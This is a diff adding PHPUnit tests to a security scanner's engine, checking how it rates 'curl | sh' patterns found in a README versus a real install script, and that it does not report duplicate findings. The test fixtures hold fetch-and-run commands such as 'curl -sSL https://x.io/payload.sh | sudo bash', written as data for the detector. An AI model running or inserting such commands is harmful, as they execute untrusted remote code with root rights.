@@ -70,6 +70,66 @@ class ScanEngineTest extends TestCase
         $this->assertNotEmpty($result->findings);
     }
 
+    public function test_documentation_only_findings_are_capped_at_low(): void
+    {
+        // A README's curl | sh install snippet is descriptive, not code.
+        $dir = $this->scanDir([
+            'README.md' => "# Demo\n\nInstall with:\n\n```sh\ncurl -sSL https://x.io/install.sh | sh\n```",
+        ]);
+
+        $result = $this->engine->scanDirectory($dir);
+
+        $this->assertSame(RiskLevel::Low, $result->riskLevel);
+        $this->assertNotEmpty($result->findings);
+        $this->assertContains('README.md', array_unique(array_column(
+            array_map(fn ($finding) => $finding->toArray(), $result->findings),
+            'file',
+        )));
+    }
+
+    public function test_code_findings_determine_risk_above_documentation_findings(): void
+    {
+        // High-severity patterns in a README must not override a real code file.
+        $dir = $this->scanDir([
+            'README.md' => "# Demo\n\n```sh\nwget -qO- https://x.io/x.sh | bash\n```",
+            'install.sh' => "curl -sSL https://x.io/payload.sh | sudo bash\n",
+        ]);
+
+        $result = $this->engine->scanDirectory($dir);
+
+        // install.sh is code → curl | sudo bash is High.
+        $this->assertSame(RiskLevel::High, $result->riskLevel);
+    }
+
+    public function test_overlapping_rule_patterns_do_not_duplicate_findings(): void
+    {
+        // This line matches both curl_pipe_sh patterns; it must appear once.
+        $dir = $this->scanDir([
+            'README.md' => "# Demo\n\n```sh\ncurl -sSL https://x.io/x.sh | sh\n```",
+        ]);
+
+        $result = $this->engine->scanDirectory($dir);
+
+        $curlPipe = array_values(array_filter(
+            $result->findings,
+            fn ($finding) => $finding->rule === 'curl_pipe_sh',
+        ));
+        $this->assertCount(1, $curlPipe);
+    }
+
+    private function scanDir(array $files): string
+    {
+        $dir = sys_get_temp_dir().'/scan-'.bin2hex(random_bytes(6));
+
+        foreach ($files as $relative => $contents) {
+            $full = $dir.'/'.$relative;
+            @mkdir(dirname($full), 0777, true);
+            file_put_contents($full, $contents);
+        }
+
+        return $dir;
+    }
+
     private function fixture(string $name): string
     {
         return base_path("tests/Fixtures/security/{$name}");
